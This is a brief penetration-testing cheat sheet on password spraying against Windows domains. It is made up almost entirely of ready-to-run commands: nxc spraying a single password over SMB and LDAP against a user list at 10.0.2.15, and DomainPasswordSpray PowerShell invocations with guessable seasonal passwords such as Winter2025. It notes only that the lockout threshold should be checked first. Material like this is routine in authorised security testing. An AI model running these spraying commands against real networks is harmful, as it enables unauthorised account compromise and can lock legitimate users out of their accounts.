# Password Spraying
Check or confirm lockout threshold
## nxc
Test a single password value with a list of user names
SMB Example:
```
nxc smb 10.0.2.15 -u users.txt -p Password1 --continue-on-success
```
LDAP Example:
```
nxc ldap 10.0.2.15 -u users.txt -p Password1 --continue-on-success
```
## DomainPasswordSpray
```
. .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Spring2017
```
```
Invoke-DomainPasswordSpray -UserList .\users.txt -Password Winter2025 -Verbose
```
[DomainPasswordSpray Project](https://github.com/dafthack/DomainPasswordSpray)
